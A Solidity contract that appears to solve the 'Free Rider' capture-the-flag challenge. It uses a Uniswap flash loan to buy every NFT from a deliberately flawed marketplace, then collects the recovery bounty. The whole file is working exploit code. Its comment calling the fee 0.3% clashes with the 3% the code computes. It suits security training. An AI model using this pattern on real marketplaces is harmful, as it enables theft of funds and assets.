pragma solidity =0.8.25;

import {WETH} from "../../lib/solmate/src/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "../../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import {IERC721} from "../../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";

interface FreeRiderNFTMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract FreeRiderExploiter {
    IUniswapV2Pair immutable pair;
    FreeRiderNFTMarketplace immutable market;

    // using solmate WETh as IWETH interface
    WETH immutable weth;

    IERC721 immutable nft;

    // FreeRiderRecoveryManager address to send NFT's to
    // do not need its interface, only address. only sending it NFT
    address immutable recoveryManager;
    // our challenge players address to receive bounty
    address immutable player;

    // Define the price of NFT as 15, and the array of all 6 tokens to purchase
    uint256[] NFT_Tokens = [0, 1, 2, 3, 4, 5];
    uint256 constant PRICE = 15 ether;

    /**
     *
     * @param _pair UniswapV2Pair contract address
     * @param _market FreeRiderMarketplace contract address
     * @param _weth WETH address
     * @param _nft DamnValuableNFT address
     * @param _recoveryManger FreeRiderRecoveryManager address
     */
    constructor(
        address _pair,
        address _market,
        address _weth,
        address _nft,
        address _recoveryManger
    ) {
        pair = IUniswapV2Pair(_pair);
        market = FreeRiderNFTMarketplace(_market);
        weth = WETH(payable(_weth));
        nft = IERC721(_nft);
        recoveryManager = _recoveryManger;
        player = msg.sender;
    }

    /**
     * @dev need to request uniswap flashloan of 15 WETH
     */
    function attack() external payable {
        // 1. Request Uniswap flash loan of 15 WETH
        // token 0 is WETH, token 1 is not WETH - we want 15 weth so we input that value first
        bytes memory data = abi.encode(PRICE);
        pair.swap(PRICE, 0, address(this), data);
    }

    /**
     * @dev this is the callback function from uniswap `swap`to initiate a flash loan
     * The uniswap `pair` contract will call this function
     * @notice the purpose of this function is to unwrap the WETh we get from uniswap
     * and convert it to ETH
     * @param amount0 the amount of ETH we took on the swap and flash loan 15 ETH

     */
    function uniswapV2Call(
        address,
        uint256 amount0,
        uint256,
        bytes calldata data
    ) external {
        // Unwrap WETH to ETH
        // 2. Unrwap 15 WETH to native ETH
        weth.withdraw(amount0);

        // 3. Request to purchase all 6 NFT's for 15 ETH
        // send 15 ETH as the msg.value upon calling `buyMany`
        market.buyMany{value: PRICE}(NFT_Tokens);

        // 4. Calculate the `fee` for the flash loan and add it to the flash loan amount
        // adds 0.3% to the 15 eth borrowed by using 103 / 100 - solidity doesnt use decimals
        uint256 loanPlusFee = (amount0 * 103) / 100;

        // 5. convert ETH to WETH (including ETH sent in from player) .01
        weth.deposit{value: loanPlusFee}();

        // 5. Pay back uniswap flash loan of 15WETH + 0.3% fee
        weth.transfer(address(pair), loanPlusFee);

        // 6. Transfer all NFT's to FreeRiderRecoverymanager
        // We need to ensure we use `safeTransferFrom` because it triggers the `onERC721Received`
        // callback on the recovery contract which pays us. If we use `safeTransfer` it will
        // transfer the NFT's but will never initiate the callback function which pays us,
        // so we wont get paid
        bytes memory _data = abi.encode(player);
        for (uint256 i = 0; i < NFT_Tokens.length; i++) {
            nft.safeTransferFrom(
                address(this),
                recoveryManager,
                NFT_Tokens[i],
                _data
            );
        }

        // 7. send remaining ETH back to player
        payable(player).call{value: address(this).balance}("");
    }

    /**
     * @dev this is the callback function that we need to implement because this
     * function is called when an NFT is transferred to this contract and the
     * transfer will fail if the return value is not returned to the sending contract
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
